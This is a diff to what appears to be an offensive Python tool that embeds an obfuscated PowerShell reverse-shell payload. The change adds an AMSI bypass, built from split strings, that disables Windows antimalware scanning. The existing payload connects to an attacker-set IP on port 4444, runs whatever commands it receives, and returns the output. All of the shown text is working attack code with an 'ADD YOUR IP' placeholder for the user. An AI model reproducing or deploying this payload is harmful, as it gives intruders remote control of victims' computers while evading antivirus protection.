@@ -17,7 +17,12 @@ time.sleep(1)
 
 # Obfuscated PowerShell reverse shell payload
 #ADD YOUR IP 
-obfuscated_payload = '''$X=New-Object System.Net.Sockets.TCPClient("YOUR-IP-HERE",4444);
+obfuscated_payload = '''
+$A=[Ref].Assembly.GetType(('System.M'+'anag'+'ement.Aut'+'omation.AMS'+'IUt'+'ils'))
+$B=$A.GetField(('ams'+'iInit'+'Failed'),'NonP'+'ublic,Static')
+$B.SetValue($null,$true)
+
+$X=New-Object System.Net.Sockets.TCPClient("YOUR-IP-HERE",4444);
 $S=$X.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0)
 {$D=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($B,0,$I);
 $R=(iex $D 2>&1 | Out-String );$R2=$R + "PS " + (pwd).Path + "> ";
